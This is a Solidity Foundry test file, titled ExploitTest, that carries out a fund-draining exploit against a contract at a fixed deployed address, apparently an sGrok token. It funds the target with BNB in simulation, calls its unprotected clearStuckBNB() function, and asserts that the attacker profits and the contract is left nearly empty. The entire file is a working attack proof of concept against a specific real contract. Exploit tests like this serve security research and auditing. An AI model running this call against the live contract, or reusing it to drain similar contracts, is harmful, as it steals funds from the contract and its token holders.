// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// No additional interfaces needed - we're using direct calls

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we just need to ensure we have sGrok tokens
        // The contract is already deployed at TARGET
        // Give ourselves some sGrok tokens as required by preconditions
        deal(TARGET, attacker, 1_000_000 * 1e18);

        // Optionally, send some BNB to the contract to make the exploit more visible
        // We can do this by calling a payable function or using vm.deal
        // Let's give the contract some BNB first
        vm.deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Call the vulnerable function to drain BNB from the contract
        (bool success, ) = TARGET.call(abi.encodeWithSignature("clearStuckBNB()"));
        require(success, "Call to clearStuckBNB failed");

        // Verify our balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "BNB balance should have increased");

        // Additional check: contract BNB balance should be 0 (or very low)
        uint256 contractBalanceAfter = TARGET.balance;
        assertLt(contractBalanceAfter, 0.1 ether, "Contract should have little to no BNB left");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

